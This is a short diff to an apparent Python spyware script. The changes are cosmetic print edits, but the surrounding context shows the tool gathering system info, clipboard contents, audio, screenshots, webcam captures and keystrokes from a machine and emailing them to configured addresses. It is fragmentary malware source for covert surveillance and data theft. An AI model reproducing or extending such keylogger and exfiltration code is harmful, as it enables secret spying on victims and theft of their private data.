@@ -197,7 +197,7 @@ def set_wallpaper():
     else: print("failed to change wallpaper.")
 
 def send_report(to_mail):
-    print("starting to send the report")
+    print("\nstarting to send the report")
     files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]
 
     # Creating the Email Object
@@ -235,8 +235,6 @@ def main():
     web_camera()
     set_wallpaper()
     keys_logger()
-
-    print('\n...\n')
     for email in Config.EMAIL_ADDRESS: send_report(email)
     print('\n...\n')
 
